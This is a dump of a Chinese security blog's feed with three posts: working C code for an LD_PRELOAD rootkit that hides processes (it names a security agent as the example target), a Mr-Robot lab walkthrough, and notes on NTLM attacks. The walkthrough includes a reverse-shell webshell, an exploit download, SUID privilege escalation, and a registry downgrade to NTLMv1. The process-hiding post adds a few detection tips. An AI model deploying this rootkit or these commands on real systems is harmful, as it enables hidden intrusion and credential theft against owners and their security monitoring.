class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="keyword">ssize_t</span> ret = readlink(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_process_name</span><span class="params">(<span class="keyword">char</span>* pid, <span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fgets(tmp, <span class="keyword">sizeof</span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line"><span class="meta">static struct dirent* (*original_##readdir)(DIR*) = NULL;               \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">struct dirent* readdir(DIR *dirp)                                       \</span></span><br><span class="line"><span class="meta">&#123;                                                                       \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span>(original_##readdir == NULL) &#123;                                    \</span></span><br><span class="line"><span class="meta">        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span>(original_##readdir == NULL)                                  \</span></span><br><span class="line"><span class="meta">        &#123;                                                               \</span></span><br><span class="line"><span class="meta">            fprintf(stderr, <span class="meta-string">&quot;Error in dlsym: %s\n&quot;</span>, dlerror());         \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    struct dirent* dir;                                                 \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    while(1)                                                            \</span></span><br><span class="line"><span class="meta">    &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        dir = original_##readdir(dirp);                                 \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span>(dir) &#123;                                                       \</span></span><br><span class="line"><span class="meta">            char dir_name[256];                                         \</span></span><br><span class="line"><span class="meta">            char process_name[256];                                     \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span>(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \</span></span><br><span class="line"><span class="meta">                strcmp(dir_name, <span class="meta-string">&quot;/proc&quot;</span>) == 0 &amp;&amp;                       \</span></span><br><span class="line"><span class="meta">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \</span></span><br><span class="line"><span class="meta">                strcmp(process_name, process_to_filter) == 0) &#123;         \</span></span><br><span class="line"><span class="meta">                continue;                                               \</span></span><br><span class="line"><span class="meta">            &#125;                                                           \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">        break;                                                          \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">    return dir;                                                         \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br></pre></td></tr></table></figure>

<p>用gcc编译成.so文件,把脚本中的YDService改成想隐藏的进程就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc hello.c -shared -fPIC -o libhello.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo /usr/local/lib/libhello.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/ld.so.preload</span><br></pre></td></tr></table></figure>

<p>测试ps是否会访问预加载，发现是加载了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strace -f ps 2&gt;&amp;1 |grep ld.so.preload</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F-%E5%8A%AB%E6%8C%81%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93LD-PRELOAD/image-20230718171017272.png" alt="image-20230718171017272"></p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>这个脚本可以根据关键字隐藏进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"># include &lt;dlfcn.h&gt;</span><br><span class="line"># include &lt;dirent.h&gt;</span><br><span class="line"># include &lt;string.h&gt;</span><br><span class="line"># include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Every process with this name will be excluded</span><br><span class="line"> */</span><br><span class="line">static const char* process_to_filter = &quot;script&quot;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Get a directory name given a DIR* handle</span><br><span class="line"> */</span><br><span class="line">static int get_dir_name(DIR* dirp, char* buf, size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    int fd = dirfd(dirp);</span><br><span class="line">    if(fd == -1) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char tmp[64];</span><br><span class="line">    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);</span><br><span class="line">    ssize_t ret = readlink(tmp, buf, size);</span><br><span class="line">    if(ret == -1) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Get a process name given its pid</span><br><span class="line"> */</span><br><span class="line">static int get_process_name(char* pid, char* buf)</span><br><span class="line">&#123;</span><br><span class="line">    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char tmp[256];</span><br><span class="line">    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(tmp, &quot;r&quot;);</span><br><span class="line">    if(f == NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(fgets(tmp, sizeof(tmp), f) == NULL) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    int unused;</span><br><span class="line">    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void Next(const char* T,int *next)&#123;</span><br><span class="line">    int i=1;</span><br><span class="line">    next[1]=0;</span><br><span class="line">    int j=0;</span><br><span class="line">    while (i&lt;strlen(T)) &#123;</span><br><span class="line">        if (j==0||T[i-1]==T[j-1]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i]=j;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            j=next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">static int KMP(char * S,const char* T)&#123;</span><br><span class="line">    int next[10];</span><br><span class="line">    Next(T,next);</span><br><span class="line">    int i=1;</span><br><span class="line">    int j=1;</span><br><span class="line">    while (i&lt;=strlen(S)&amp;&amp;j&lt;=strlen(T)) &#123;</span><br><span class="line">        if (j==0 || S[i-1]==T[j-1]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            j=next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (j&gt;strlen(T)) &#123;</span><br><span class="line">        return i-(int)strlen(T);</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># define DECLARE_READDIR(dirent, readdir)                                \</span><br><span class="line">static struct dirent* (*original_## readdir)(DIR*) = NULL;               \</span><br><span class="line">                                                                        \</span><br><span class="line">struct dirent* readdir(DIR *dirp)                                       \</span><br><span class="line">&#123;                                                                       \</span><br><span class="line">    if(original_## readdir == NULL) &#123;                                    \</span><br><span class="line">        original_## readdir = dlsym(RTLD_NEXT, # readdir);               \</span><br><span class="line">        if(original_## readdir == NULL)                                  \</span><br><span class="line">        &#123;                                                               \</span><br><span class="line">            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">                                                                        \</span><br><span class="line">    struct dirent* dir;                                                 \</span><br><span class="line">                                                                        \</span><br><span class="line">    while(1)                                                            \</span><br><span class="line">    &#123;                                                                   \</span><br><span class="line">        dir = original_## readdir(dirp);                                 \</span><br><span class="line">        if(dir) &#123;                                                       \</span><br><span class="line">            char dir_name[256];                                         \</span><br><span class="line">            char process_name[256];                                     \</span><br><span class="line">            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \</span><br><span class="line">                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \</span><br><span class="line">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \</span><br><span class="line">                KMP(process_name, process_to_filter)!=-1) &#123;         \</span><br><span class="line">                continue;                                               \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">        break;                                                          \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">    return dir;                                                         \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br></pre></td></tr></table></figure>

<h2 id="应对方法"><a href="#应对方法" class="headerlink" title="应对方法"></a>应对方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、busybox</span><br><span class="line">busybox ps方式执行ps，可以不预加载库对于劫持lib场景有奇效。</span><br><span class="line">busybox ps</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、sysdig</span><br><span class="line">还可以通过</span><br><span class="line"></span><br><span class="line">sudo sysdig -c topprocs_cpu     # 查看cpu进程占用情况</span><br><span class="line">sudo sysdig proc.name contains evil_script   # 针对包含evil_script的进程监测</span><br><span class="line"># 监测网络情况</span><br><span class="line">sudo sysdig -c topprocs_net</span><br><span class="line">sudo sysdig -c topconns</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>Mr-Robot: 1</title>
    <url>/2022/11/10/Mr-Robot-1/</url>
    <content><![CDATA[<h1 id="Mr-Robot-1"><a href="#Mr-Robot-1" class="headerlink" title="Mr-Robot: 1"></a>Mr-Robot: 1</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是用nmap拿到对面的ip地址,靶机记得开nat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -n -sP -sn 192.168.100.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg" alt="image-20221110110904031"></p>
<p><code>nmap -A 192.168.100.171</code></p>
<p>22,80,443端口</p>
<p>应该又是一场web</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111230278.png" alt="image-20221110111230278"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111613077.png" alt="image-20221110111613077"></p>
<p>大多都是403，只有一个登录界面有权限，还有一个robots.txt</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112652658.png" alt="image-20221110112652658"></p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112936692.png" alt="image-20221110112936692"></p>
<p>第一个文件是一堆不知道什么玩意的文件</p>
<p>073403c8a58a1f80d943455fb30724b9（第二个文件是一串字符）</p>
<p><code>whatweb http://192.168.100.171/wp-login</code></p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111721740.png" alt="image-20221110111721740"></p>
<p>没找到cms，没有测试到sql(后面才看到是wordpress的博客)</p>
<p>又扫到一个<code>http://192.168.100.171/admin/index.html</code></p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112147271.png" alt="image-20221110112147271"></p>
<p>随后查攻略得知，上面那个不知道什么玩意的文件是一堆用户名，在后台忘记密码的那个地方进行爆破。</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110114210530.png" alt="image-20221110114210530"></p>
<p>爆破出用户名为Elliot，再用这个字典爆破密码，密码为ER28-0652</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/10/Mr-Robot-1/image-20221110114718865.png" alt="image-20221110114718865"></p>
<p>直接把马弄上去</p>
<p>地址为<code>http://192.168.100.171/wordpress/wp-content/themes/twentyfifteen/404.php</code></p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110115211320.png" alt="image-20221110115211320"></p>
<p>随后改成反弹shell的php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/webshells/php</span><br><span class="line"></span><br><span class="line">cat php-reverse-shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122205300.png" alt="image-20221110122205300"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>还是先弄一个tty出来</p>
<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122339397.png" alt="image-20221110122339397"></p>
<p><code>lsb_release -a</code>查看linux版本信息</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122504710.png" alt="image-20221110122504710"></p>
<p>Ubuntu 14.04</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122936419.png" alt="image-20221110122936419"></p>
<p>下载exp</p>
<p>用python传过去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 2333</span><br><span class="line">mkdir /tmp/sh(如果是提权的话，目前用户需要先创建一个可以创建新文件的文件夹进行操作)</span><br><span class="line">cd /tmp/sh</span><br><span class="line">wget http://192.168.101.20:2333/42276.c</span><br></pre></td></tr></table></figure>

<p>编译</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123255149.png" alt="image-20221110123255149"></p>
<p>出错了，我们换一个exp</p>
<p>又出错了。。</p>
<p>后来发现需要使用suid提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p>寻找具有suid权限的文件</p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123931959.png" alt="image-20221110123931959"></p>
<p>有nmap</p>
<p><code>nmap --interactive</code></p>
<p><code>!sh</code></p>
<p><img src="/2022/11/10/Mr-Robot-1/image-20221110124024386.png" alt="image-20221110124024386"></p>
<p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224">(122条消息) nmap提权几种方式_1winner的博客-CSDN博客_nmap提权</a></p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>NTLM协议</title>
    <url>/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h1><p>相当于读书笔记吧，这下面都是我手打的，图也是我画的，手好痛。也确实有段时间没有更新博客了，主要是方向的转变，不过网安依旧是我的主要攻略目标好吧。</p>
<p>NTLM协议是微软用于Windows身份验证的主要协议之一。从早期的SMB到因为安全问题改成的LM再最后变成NTLM协议.NTML即可用于域环境身份验证，还可为SMB、HTTP、LDAP、SMTP等上层微软应用提供身份验证。</p>
<h2 id="SSPI和SSP的概念"><a href="#SSPI和SSP的概念" class="headerlink" title="SSPI和SSP的概念"></a>SSPI和SSP的概念</h2><p>SSPI是Windows定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于，身份验证机制，为其他协议提供的Session Security机制。</p>
<p>但是SSPI只是定义了一套接口函数，并没有实现具体内容。</p>
<p>SSP是SSPI的实现者，微软自己实现了很多SSP,用于提供安全功能,下面介绍几个比较经典的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTLP SSP：windows NT 3.51中引入的，为windows2000以前的客户端服务器域和非域身份验证提供NTLM查询\响应身份验证。</span><br><span class="line"></span><br><span class="line">Kerberos SSP:windows 2000中间引入，windows vista中更新为支持AES，为windows2000及更高版本中首选的客户端-服务器域提供相互身份验证。</span><br><span class="line"></span><br><span class="line">Digest SSP:winows xp中引入，在windows系统与非windows系统间提供基于HTTP和SASL身份验证的质询/响应。</span><br><span class="line"></span><br><span class="line">Negotiate SSP:windows2000中引入，默认选择Kerberos，如果不可用，则选择NTLM。</span><br><span class="line"></span><br><span class="line">Cred SSP：windows vista中引入，为远程桌面连接提供单点登录和网络级身份验证。</span><br><span class="line"></span><br><span class="line">Schannel SSP：windows 2000中引入，，后续更新为支持AES加密。</span><br><span class="line"></span><br><span class="line">PKU2U SSP:windows 7中引入，在不隶属于域的系统之间提供数字证书的对等身份验证。</span><br></pre></td></tr></table></figure>

<p>因为SSPI中定义了域Session security有关的API，所以上层应用题用任何SSP与远程的服务进行身份验证后，此SSP都会为本次连接生成一个随机的key,这个随机key被成为session key.在系统层面,SSP就是一个dll,用来实现身份验证.不同的SSP，实现的身份验证机制是不一样的，比如NTLM SSP，实现的是一种基于质询/响应的身份验证机制，而Kerberos SSP实现的是基于Ticket的身份验证机制。我们可以编写自己的SSP,然后注册到操作系统中,</p>
<p><img src="/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/image-20230113124624449.png" alt="image-20230113124624449"></p>
<h2 id="LM-Hash算法"><a href="#LM-Hash算法" class="headerlink" title="LM Hash算法"></a>LM Hash算法</h2><p>LM是微软退出的一个身份认证协议,使用的加密算法是LM HASH。虽然比较容易被破解，但是为了保证系统的兼容性，windows就知识将LM HASH禁用，(从Windows vista 和windows 2008开始就禁用了)，LM HASH的明文密码被限定在14位以内，也就是说，如果要停止使用LM HASH，将用户的密码设置为14位以上就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LM HASH的加密流程如下</span><br><span class="line"></span><br><span class="line">明文密码-全部改成大写-转为16进制-如果转换后的16进制字符串的长度不足14B（长度28），剩下的用0来补全。</span><br><span class="line"></span><br><span class="line">随后，将14B分为两组，每组7B，然后转换为2进制数据，每组二进制数据的长度为56bit。</span><br><span class="line"></span><br><span class="line">将每组二进制数据安7bit为一组，分为8组，每组末尾家0，在转换成十六进制。这样每组也就成了8B长度的十六进制数据了。</span><br><span class="line"></span><br><span class="line">将上面生成的两组8B的十六进制数据，分别作为DES加密密钥，队字符串“KGS!@#$%”进行加密，然后将DES 加密后的两组密文进行拼接，得到最终的LM HASH。</span><br></pre></td></tr></table></figure>

<h2 id="NTLM-Hash算法"><a href="#NTLM-Hash算法" class="headerlink" title="NTLM Hash算法"></a>NTLM Hash算法</h2><p>从Windows vista和windows servers 2008开始，默认禁用了LM Hash的支持。也就是说，默认只存储了NTLM Hash的值。（用LM的基本只有三个  2000 XP  server2002）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密流程如下：</span><br><span class="line">1.将用户密码转换为十六进制格式</span><br><span class="line">2.将ASCII编码的十六进制格式的字符串转换为Unicode编码，</span><br><span class="line">3.队Unicode编码的十六进制字符串进行标准MD4单向Hash加密。</span><br></pre></td></tr></table></figure>

<p>用户的密码经过NTLM Hash加密后存储在<code>C:\Windows\System32\config\SAM</code>中</p>
<p>在用户输入密码进行本地认证的过程中，所有操作都是本定进行的，系统将用户输入的密码转换成NTLM Hash在SAM文件中进行比较,如果相同就是密码正确.当用户注销,重启,锁屏后,操作系统会让winlogon.exe显示登录界面，也就是输入框。当winlogn.exe接收输入后，将密码交给lsass.exe进程，开始进行比较。lsass.exe进程中会存一份明文密码，我们使用的mimikatz就是从lsass.exe进程中抓去明文密码或者Hash密码。</p>
<h2 id="NTLM协议认证"><a href="#NTLM协议认证" class="headerlink" title="NTLM协议认证"></a>NTLM协议认证</h2><p>NTLM（NT LAN MANAGER）是一种网络认证协议，它是基于质询（Challenge）/响应（Response）认证机制的一种认证模式。</p>
<p>NTLM使用在Windows NT和Windows 2000 Server（or later）工作组环境中（kerberos用在域模式下）。在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。</p>
<p>NTLM协议的认证过程分为三步：</p>
<p>1、协商：主要用于确认双方协议版本（NTLM v1/NTLM v2）</p>
<p>2、质询：就是挑战/响应认证机制起作用的范畴</p>
<p>3、验证：验证主要是在质询完成后，验证结果，是认证的最后一步</p>
<p>质询的完整过程：</p>
<p>1、客户端向服务端发送用户信息（用户名）请求</p>
<p>2、服务器接受到请求，判断本地账户列表是否有用户名，如果有，生成一个16位的随机数，被称之为“Challenge”，使用登陆用户名对应NTLM Hash加密Challenge（16位随机字符），生成Challenge1，生成一个Net-NTLM Hash存在内存中，同时，生成Challenge1后，将Challenge（16位随机字符）发送给客户端。</p>
<p>3、客户端接收到Challenge后，使用将要登陆的账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p>
<p>4、验证，服务器接收到客户端的Response后，对比Challenge1与Response是否相等，若相等，则认证通过。</p>
<p>NTLM是底层的认证协议，必须嵌入上层应用协议中，消息都传输依赖于使用NTLM的上层协议，比如SMB,HTTP等。</p>
<p>这里本来是有一个抓包实验的，但是我这边才装的电脑就不弄了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当应用SMB协议传输NTLM协议的时候，NTLM认证的数据包都是放在GSS-API中的。</span><br><span class="line">什么是GSS-API呢？</span><br><span class="line">通用安全服务应用程序接口(GSSAPI) 是为了让程序能够访问安全服务的一个应用程序接口。</span><br><span class="line">使用 GSS-API，程序员在编写应用程序时，可以应用通用的安全机制。</span><br><span class="line">开发者不必针对任何特定的平台、安全机制、保护类型或传输协议来定制安全实现。</span><br><span class="line">使用 GSS-API，程序员可忽略保护网络数据方面的细节。</span><br><span class="line">使用 GSS-API 编写的程序在网络安全方面具有更高的可移植性。</span><br><span class="line">这种可移植性是通用安全服务 API 的一个特点。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一些小知识：</span><br><span class="line">工作组环境下默认均不签名</span><br><span class="line">域环境下的NTLM认证，服务端会把协议认证发送给域控，域控会把认证结果成功与否返回给服务端。</span><br></pre></td></tr></table></figure>

<p>NTML和NTLM v2的区别：</p>
<p>v1和v2是NTLM身份认证协议，但是是不同版本，只是其中的chalenge值与加密算法不同而已。</p>
<p>下面介绍lmcompatibilityLevel</p>
<p><img src="/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/image-20230125131209709.png" alt="image-20230125131209709"></p>
<p>我们可以手动修改本地安全策略进行lmcompatibilityLevel值的修改。在本地安全策略中的安全选项中的网络安全中进行设置。或者也可以通过修改注册表进行修改。</p>
<h2 id="NTLM协议的安全问题"><a href="#NTLM协议的安全问题" class="headerlink" title="NTLM协议的安全问题"></a>NTLM协议的安全问题</h2><p>从上面的NTLM认证的流程中可以看到，在type3消息中是使用用户密码Hash进计算的。因此，当没有拿到用户的明文密码而只拿到Hash的情况下，可以进行Pass The Hash(PTH)攻击，也就是常说的哈希传递攻击。同样，还是在type3消息中，存在Net-NTLM hash，当获得了Net-NTLM hash之后，可以进行中年人攻击，重放Net-NTLM hash，这种手法也就是常说的NTLM Relay(NTLM中继)攻击。由于NTLM v1协议加密过程存在天然缺陷，因此可以队Net-NTLM v1 Hash进行破解，得到NTLM Hash之后即可横向移动。下面介绍一下三中基于NTLM的攻击手法</p>
<h3 id="1-Pass-The-Hash"><a href="#1-Pass-The-Hash" class="headerlink" title="1.Pass The Hash"></a>1.Pass The Hash</h3><p>Pass The Hash攻击是内网横向移动的一种方式。由于NTLM认证过程中使用的是用户密码的NTLM hash来进行加密，因此当或渠道了用户密码的NTLMhash而没有解出明文密码的时候，就可以利用此NTLMhash来进行哈希传递攻击。对内网其他机器进行hash碰撞，碰撞到使用相同密码的机器。然后通过135或者445端口横向移动。这本书后面也会写详细的过程，我们后面再继续进行相关的介绍。</p>
<h3 id="2-NTLM-Relay"><a href="#2-NTLM-Relay" class="headerlink" title="2.NTLM Relay"></a>2.NTLM Relay</h3><p>严格意义上这个名字并不正确，应该叫Net-NTLM Relay。他发生在NTLM认证的第三步,在response消息中存在Net-NTLM hash,或则Net-NTLM hash后,可以进行中间人攻击,重放Net-NTLM,同样,我们后续会进行介绍.</p>
<h3 id="3-Net-NTLM-v1-Hash破解"><a href="#3-Net-NTLM-v1-Hash破解" class="headerlink" title="3.Net-NTLM v1 Hash破解"></a>3.Net-NTLM v1 Hash破解</h3><p>由于NTLM v1存在天然缺陷，只要获取到Net-NTLM v1 hash，就能破解为NTLM Hash，这与密码强度无关。在域环境中，这一点更为明显，因为在域环境中可以直接使用hash连接目标机器。如果域控允许发送NTLM v1响应，我们就可以通过与域控机器进行NTLM认证，然后抓去域控的Net-NTLMv1 hash，然后破解为NTLM hash，使用域控的机器账户和Hash即可到处域内所有用户Hash。</p>
<p>但是有一个缺点，自从windows vista开始，微软就默认使用NTLM v2身份认证，想要降级到v1，需要手动修改，并且需要目标主机的管理员权限。<code>本地安全策略，安全设置，本地策略，安全选项，网络安全:LAN管理器身份验证级别</code>将其修改成进发送NTLM响应。</p>
<p>或者也可以通过执行命令修改注册表来达到这个效果。</p>
<h3 id="Net-NTLMv1的利用思路"><a href="#Net-NTLMv1的利用思路" class="headerlink" title="Net-NTLMv1的利用思路"></a>Net-NTLMv1的利用思路</h3><p>由于Net-NTLMv1的脆弱性，在控制Challenge后可以在短时间内通过彩虹表还原出用户的ntlm hash，所以在利用上首选的是将Win7环境下的默认Net-NTLMv2降级到Net-NTLMv1，获取本机的通信数据，还原出ntlm hash。</p>
<p>实现工具: InternalMonologue</p>
<p>下载地址： <a href="https://github.com/eladshamir/Internal-Monologue">https://github.com/eladshamir/Internal-Monologue</a></p>
<p>注意点：</p>
<p>1、自Windows Vista/Server2008开始起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限。</p>
<p>2、修改注册表需要管理员权限</p>
<p>修改注册表开启Net-NTLMv1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f</span><br></pre></td></tr></table></figure>

<p>为确保Net-NTLMv1开启成功，还需要修改两处注册表键值：</p>
